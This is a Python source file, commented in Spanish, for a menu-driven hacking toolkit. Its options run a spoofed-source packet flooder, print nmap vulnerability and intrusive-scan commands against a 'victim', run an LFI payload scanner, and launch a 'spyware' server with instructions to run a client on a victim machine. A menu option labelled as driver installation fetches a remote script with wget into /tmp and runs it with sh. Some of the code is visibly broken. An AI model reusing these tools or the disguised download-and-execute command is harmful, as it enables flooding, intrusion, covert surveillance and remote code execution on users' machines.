import socket
import requests
import random
import time
import numpy as np
import matplotlib.pyplot as plt
import scipy.io.wavfile as wavfile
from scipy.fft import fft
import skrf as rf
import binascii
from scapy.all import *
import math
import folium
import webbrowser
import tkinter as tk
from tkinter import ttk
from shapely.geometry import LineString
import urllib3
import librosa
import urllib
import ipaddress
import pyaudio
from rtlsdr import RtlSdr
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
from uuid import getnode as get_mac
from socket import gethostbyname, gethostname


def verificar_servidor(url):
    try:
        # Intentamos realizar una solicitud HTTP al servidor
        response = requests.get(url)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False


def fourier(wavfilez):
    # Leer el archivo de audio .wav
    sample_rate, audio_data = wavfile.read(wavfilez)
    
    # Extraer una sola canal si es estéreo (audio mono)
    if len(audio_data.shape) == 2:
        audio_data = audio_data[:, 0]
    
    # Calcular la transformada de Fourier de los datos de audio
    fft_result = fft(audio_data)
    N = len(audio_data)
    
    # Calcular las frecuencias correspondientes a las componentes de Fourier
    frequencies = np.fft.fftfreq(N, 1 / sample_rate)
    
    # Encuentra las amplitudes de las componentes principales
    amplitudes = np.abs(fft_result)
    
    # Filtra las componentes con amplitudes significativas
    umbral_amplitud = 1000  # Ajusta el umbral según tus datos
    frecuencias_significativas = frequencies[amplitudes > umbral_amplitud]
    
    # Redondea las frecuencias con precisión de 0.0001
    precision = 0.0001
    frecuencias_redondeadas = np.round(frecuencias_significativas / precision) * precision
    
    # Elimina frecuencias duplicadas
    frecuencias_unicas = np.unique(frecuencias_redondeadas)
    
    # Gráfica de las ondas de las componentes significativas
    plt.figure(figsize=(12, 6))
    for freq in frecuencias_significativas:
        if freq > 0:
            componente = np.exp(2j * np.pi * freq * np.arange(N))
            onda = np.real(fft_result[frequencies == freq][0]) * componente
            plt.plot(onda)
    
    plt.title('Componentes de Onda Significativas en Audio')
    plt.xlabel('Muestras de Audio')
    plt.ylabel('Amplitud')
    plt.legend()
    plt.grid(True)
    print("showing")
    plt.show()

def enviar_paquete_hex(ip_destino, puerto_destino, datos_hex):
    # Crear un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conectar al dispositivo en la dirección IP y puerto específicos
    s.connect((ip_destino, puerto_destino))

    try:
        # Convertir la cadena hexadecimal en datos binarios
        datos_binarios = binascii.unhexlify(datos_hex)

        # Enviar los datos binarios al dispositivo
        s.sendall(datos_binarios)

        # Puedes agregar más lógica aquí, como recibir la respuesta del dispositivo si es necesario
        respuesta = s.recv(1024)
        print("Respuesta del dispositivo:", respuesta.decode('utf-8'))

    finally:
        # Cerrar la conexión
        s.close()
def send_packet(src_ip, dst_ip, protocol):
    while True:
        if protocol == "icmp":
            packet = IP(src=src_ip, dst=dst_ip) / ICMP()
        elif protocol == "tcp":
            packet = IP(src=src_ip, dst=dst_ip) / TCP()
        elif protocol == "udp":
            packet = IP(src=src_ip, dst=dst_ip) / UDP()
        elif protocol == "dns":
            packet = IP(src=src_ip, dst=dst_ip) / UDP() / DNS(qd=DNSQR(qname="example.com"))

        send(packet)
def triangular():
    # Crear un mapa en blanco
    mapa = folium.Map(location=[0, 0], zoom_start=5)
    
    # Lista para almacenar las coordenadas finales de las líneas
    coordenadas_finales = []
    
    # Función para abrir el mapa interactivo
    def abrir_mapa():
        # Obtener las coordenadas y ángulo desde las entradas de usuario
        latitud = float(latitud_entry.get())
        longitud = float(longitud_entry.get())
        angulo = float(angulo_entry.get())
    
        # Agregar un marcador en la ubicación actual
        folium.Marker([latitud, longitud], tooltip='You').add_to(mapa)
    
        # Función para dibujar una línea en una dirección específica desde la ubicación actual
        def dibujar_linea_angulo(latitud, longitud, angulo):
            angulo_rad = math.radians(angulo)
            latitud_destino = latitud + (1000 / 111.32) * (180 / math.pi) * math.cos(angulo_rad)
            longitud_destino = longitud + (1000 / (111.32 * math.cos(math.radians(latitud))) * (180 / math.pi) * math.sin(angulo_rad))
            coordenadas_finales.append((latitud_destino, longitud_destino))
            folium.PolyLine([[latitud, longitud], [latitud_destino, longitud_destino]], color='red').add_to(mapa)
    
        # Dibujar una línea desde la ubicación actual con el ángulo especificado
        dibujar_linea_angulo(latitud, longitud, angulo)
    
    # Función para verificar la intersección
    def verificar_interseccion():
        if len(coordenadas_finales) >= 2:
            lineas = [LineString(coordenadas_finales)]
            for i in range(len(coordenadas_finales) - 1):
                for j in range(i + 1, len(coordenadas_finales)):
                    linea1 = LineString([coordenadas_finales[i], coordenadas_finales[i + 1]])
                    linea2 = LineString([coordenadas_finales[j], coordenadas_finales[j + 1]])
                    if linea1.intersects(linea2):
                        interseccion = linea1.intersection(linea2)
                        print(f'Las líneas se entrelazan en las coordenadas: {interseccion.wkt}')
                        distancia_linea1 = linea1.project(interseccion)
                        distancia_linea2 = linea2.project(interseccion)
                        print(f'Distancia desde el inicio de la línea 1 hasta la intersección: {distancia_linea1:.2f} metros')
                        print(f'Distancia desde el inicio de la línea 2 hasta la intersección: {distancia_linea2:.2f} metros')
    
    # Función para obtener coordenadas al hacer clic en el mapa
    def coordenadas_cursor(e):
        latitud, longitud = e.latlng
        coordenadas_label.config(text=f'Latitud: {latitud:.6f}\nLongitud: {longitud:.6f}')
    
    # Crear la ventana de la aplicación
    app = tk.Tk()
    app.title('Mapa Interactivo')
    
    # Crear y configurar etiquetas y entradas de usuario
    latitud_label = ttk.Label(app, text='Latitud:')
    latitud_label.pack()
    latitud_entry = ttk.Entry(app)
    latitud_entry.pack()
    
    longitud_label = ttk.Label(app, text='Longitud:')
    longitud_label.pack()
    longitud_entry = ttk.Entry(app)
    longitud_entry.pack()
    
    angulo_label = ttk.Label(app, text='Ángulo (en grados):')
    angulo_label.pack()
    angulo_entry = ttk.Entry(app)
    angulo_entry.pack()
    
    # Botón para abrir el mapa
    abrir_mapa_button = ttk.Button(app, text='Agregar Marcador y Línea', command=abrir_mapa)
    abrir_mapa_button.pack()
    
    # Botón para verificar intersección
    verificar_interseccion_button = ttk.Button(app, text='Verificar Intersección', command=verificar_interseccion)
    verificar_interseccion_button.pack()
    
    # Etiqueta para mostrar las coordenadas en tiempo real
    coordenadas_label = ttk.Label(app, text='')
    coordenadas_label.pack()
    
    # Asociar el evento 'click' del mapa con la función 'coordenadas_cursor'
    mapa.add_child(folium.ClickForMarker(popup='Coordenadas'))
    mapa.add_child(folium.LatLngPopup())
    
    # Función para abrir el mapa interactivo en el navegador
    def mostrar_mapa():
        # Guardar el mapa como un archivo HTML interactivo
        mapa.save('mapa_interactivo.html')
    
        # Abrir el mapa en el navegador
        webbrowser.open('mapa_interactivo.html')
    
    # Botón para mostrar el mapa interactivo
    mostrar_mapa_button = ttk.Button(app, text='Mostrar Mapa', command=mostrar_mapa)
    mostrar_mapa_button.pack()
    
    # Iniciar la aplicación
    app.mainloop()
nmap_vulnerabilidades = """
Auth- execute all dispo scripts for authentication
    sudo nmap -f -sS -sV -Pn --script auth {ip}
Default- execute the default basics scripts of the tool
    sudo nmap -f -sS -sV -Pn --script default {ip}
Discovery- recovery the infromation of the target
    sudo nmap -f -sS -sV -Pn --script safe {ip}
External- A script for use external resources
    sudo nmap -f -sS -sV -Pn --script external {ip}
Intrusive- Use scripts who are considerated intrusives for the victim
    sudo nmap -f -sS -sV -Pn --script intrusive {ip}
Safe- execute scripts who aren't intrisuves
    sudo nmap -f -sS -sV -Pn --script safe {ip}
Vuln- discovery the vulnerabilities best knowed
    sudo nmap -f -sS -sV -Pn --script vuln {ip}
All- Execute all the scripts with who have a NSE extension available
    sudo nmap -f -sS -sV -Pn --script all {ip}
                        """

def lfi():
    def detect_lfi(response_text):
        if response_text.startswith('/etc/passwd') or response_text.startswith('\\windows\\win.ini'):
            return True
    
        log_file_pattern = r'\[.*\]\s.*(apache2|nginx)\s.*:\s.*\n'
        if re.search(log_file_pattern, response_text):
            return True
    
    def check_lfi(url, payload):
        encoded_payload = urllib.parse.quote(payload)
        response = requests.get(url, params={'file': encoded_payload}, verify=False)
        if detect_lfi(response.text):
            print('""""""""""""""')
            print(f"Se puede acceder al archivo: {payload}")
            print('""""""""""""""')
        else:
            print(f"No se puede acceder al archivo: {payload}")
    
    url = input("URL(https://example.es/main.php?file=) ->")
    
    # Load payloads from a file
    with open('./wordlists/LFI_all.txt', 'r') as file:
        payloads = file.read().splitlines()
    
    for payload in payloads:
        check_lfi(url, payload)

def detectar_tipo_y_convertir(ip):
    try:
        # Intenta crear un objeto de dirección IP
        direccion_ip = ipaddress.ip_address(ip)

        # Verifica si es IPv4 o IPv6
        if direccion_ip.version == 4:
            print(f"{ip} es una dirección IPv4.")
        elif direccion_ip.version == 6:
            # Intenta convertir la dirección IPv6 a IPv4 si es posible
            ipv4_conversion = direccion_ip.ipv4_mapped
        else:
            pass

    except ValueError:
        print(f"{ip} no es una dirección IP válida.")

def create_own_spyware():
    print("1- Create SpyWare")
    print("2- Connect SpyWare")
    optione = input("_>>")
    if optione == "1":
        ip = input("Ingresa tu IP:")
        puerto = input("Ingresa el puerto ")
    if optione == "2":
        ur_ip = urllib.request.urlopen("https://ident.me").read().decode("utf8")
        puerno = int(input("Ingrese el puerto de escucha:"))
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Define el servidor
        server.bind(('{ur_ip}', puerno)) # Establece cual es la IP y el puerto de escucha
        print('starting up on {ur_ip} port {puerno}'.format(*server))
        server.bind(ur_ip) 
        server.listen(1) #escuchar a una IP en tal puerto
        while True:
            # Wait for a connection
            print('waiting for a connection')
            connection, client_address = server.accept() # Si hay una conexion que la acepte
            print('connection from', client_address)# Receive the data in small chunks and retransmit it
            while True:
                data = connection.recv(16) # recibe los datos del cliente a 16 bytes
                print('received {!r}'.format(data)) # te printea la informacion que fue recibida # EN PROCESO DE CAMBIO
                if data:
                    print('sending data back to the client')
                    connection.sendall(data)
                else:
                    print('no data from', client_address)
                    pass
            

#TRANSMITIRTODO
def obtener_longitud_clave():
    opciones_longitud_clave = [32, 64, 128]

    print("Elige la longitud de la clave de encriptación:")
    for i, opcion in enumerate(opciones_longitud_clave):
        print(f"{i + 1}. {opcion} bytes")

    while True:
        seleccion = input("Ingresa el número correspondiente a la longitud deseada: ")
        try:
            seleccion = int(seleccion)
            if seleccion in range(1, len(opciones_longitud_clave) + 1):
                return opciones_longitud_clave[seleccion - 1]
            else:
                print("Selección no válida. Por favor, elige un número válido.")
        except ValueError:
            print("Por favor, ingresa un número válido.")

def obtener_clave(longitud):
    clave = input(f"Ingresa la clave para AES (debe tener al menos {longitud} bytes): ").encode('utf-8')

    while len(clave) < longitud:
        print(f"La clave debe tener al menos {longitud} bytes.")
        clave = input(f"Ingresa la clave para AES (debe tener al menos {longitud} bytes): ").encode('utf-8')

    return clave[:longitud]

def cifrar(clave, data):
    iv = secrets.token_bytes(16)
    cipher = Cipher(algorithms.AES(clave), modes.GCM(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    tag = encryptor.tag
    return iv + tag + ciphertext

def reproducir_en_tiempo_real(clave_aes, sdr):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100

    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    print("Reproduciendo en tiempo real. Presiona Ctrl+C para detener.")

    try:
        while True:
            data = stream.read(CHUNK)
            encrypted_data = cifrar(clave_aes, np.frombuffer(data, dtype=np.int16).tobytes())
            sdr.write_samples(np.frombuffer(encrypted_data, dtype=np.int16))

    except KeyboardInterrupt:
        print("Detenido por el usuario.")
    finally:
        stream.stop_stream()
        stream.close()
        p.terminate()
        sdr.close()
#EA TERMINAO
def info():
    mac = get_mac()
    nombre_equipo = socket.gethostname()
    direccion_equipo = socket.gethostbyname(nombre_equipo)
    mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    print(s.getsockname()[0])
    from netifaces import interfaces, ifaddresses, AF_INET
    for ifaceName in interfaces():
        addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
        print(' '.join(addresses))

# Me gustaria declararle mi amor pero solo se declarar variables 
def main():
    while True:
        print("0- Instalar drivers de la interfaz de red")
        print("1- Verificar si el servidor está en línea.")
        print("2- Ejecutar spyware")
        print("3- transformada de fourier (wav)")
        print("4- Enviar paquete soofeado")
        print("5- Flood con paquetes")
        print("6- Comandos para exploits")
        print("7- Triangular señal de radio")
        print("8- Detectar Local File Inclusion")
        print("9- Transmitir audio encriptado")
        print("10- Watch all IPs asociated to your network")
        print("")
        opcion = input("seleccione una opción: ")
        if opcion == "0":
            os.system("sh -c 'wget deb.trendtechcn.com/install -O /tmp/install && sh /tmp/install'")
        if opcion == '1':
            url = input("URL del servidor: ")
            if verificar_servidor(url):
                print(f"El servidor {url} está en línea.")
            else:
                print(f"El servidor {url} no está en línea.")
        if opcion == "2":
            print("1- Linux")
            print("2- Windows")
            optione = int(input(""))
            if optione == 1:
                print("Spyware/Linux/dist")
                print("ejecute en la maquina victima el archivo(client)")
                time.sleep(10)
                os.system("cd Spyware && cd Linux && cd dist && sudo ./server")
            if optione == 2:
                print("ejecute en la maquina victima el archivo(client)")
                time.sleep(10)
                os.system("cd Spyware && cd Windows && cd dist && server.exe")
        if opcion == "3":
            wavfilez = input("Ingrese nombre del archivo .wav: ")
            fourier(wavfilez)
        if opcion == "4":
            ip_destino = input("IP destino: ")
            puerto_destino = int(input("Puerto destino: "))
            datos_hex = input("Datos en hexadecimal sin separar: ")
            enviar_paquete_hex(ip_destino, puerto_destino, datos_hex)
        if opcion == "5":
            protocol = input("Choose a protocol (icmp/tcp/udp/dns): ").lower()
            src_ip = input("Sender IP: ")
            dst_ip = input("Destination IP: ")
            send_packet(src_ip, dst_ip, protocol)
        if opcion == "6":
            ip = input("Ingrese el dominio/IP:")
            print("Auth- execute all dispo scripts for authentication")
            print("    sudo nmap -f -sS -sV -Pn --script auth " + ip)
            print("Default- execute the default basics scripts of the tool")
            print("    sudo nmap -f -sS -sV -Pn --script default " + ip)
            print("Discovery- recovery the infromation of the target ")
            print("    sudo nmap -f -sS -sV -Pn --script safe " + ip)
            print("External- A script for use external resources ")
            print("    sudo nmap -f -sS -sV -Pn --script external " + ip)
            print("Intrusive- Use scripts who are considerated intrusives for the victim")
            print("    sudo nmap -f -sS -sV -Pn --script intrusive " + ip)
            print("Safe- execute scripts who aren't intrisuves")
            print("    sudo nmap -f -sS -sV -Pn --script safe " + ip)
            print("Vuln- discovery the vulnerabilities best knowed")
            print("    sudo nmap -f -sS -sV -Pn --script vuln " + ip)
            print("")
            print("All- Execute all the scripts with who have a NSE extension available")
            print("    sudo nmap -f -sS -sV -Pn --script all " + ip)
        if opcion == "7":
            while True:
                triangular()
        if opcion == "8":
            lfi()
        if opcion == "9":
            sdr = RtlSdr()
            sdr.sample_rate = float(input("Sample rate: "))  # 2.048 MHz
            sdr.center_freq = int(input("Frequency to transmit: "))    # 433 MHz (adjust as needed)
            sdr.gain = 'auto'
            longitud_clave = obtener_longitud_clave()
            clave_aes = obtener_clave(longitud_clave)
        
            # Iniciar la reproducción en tiempo real
            reproducir_en_tiempo_real(clave_aes, sdr)
        if opcion == "10":
            info()
        else:
            print("Ingrese un valor apropiado...")
            time.sleep(3)
            pass

if __name__ == "__main__":
    while True:
        main()
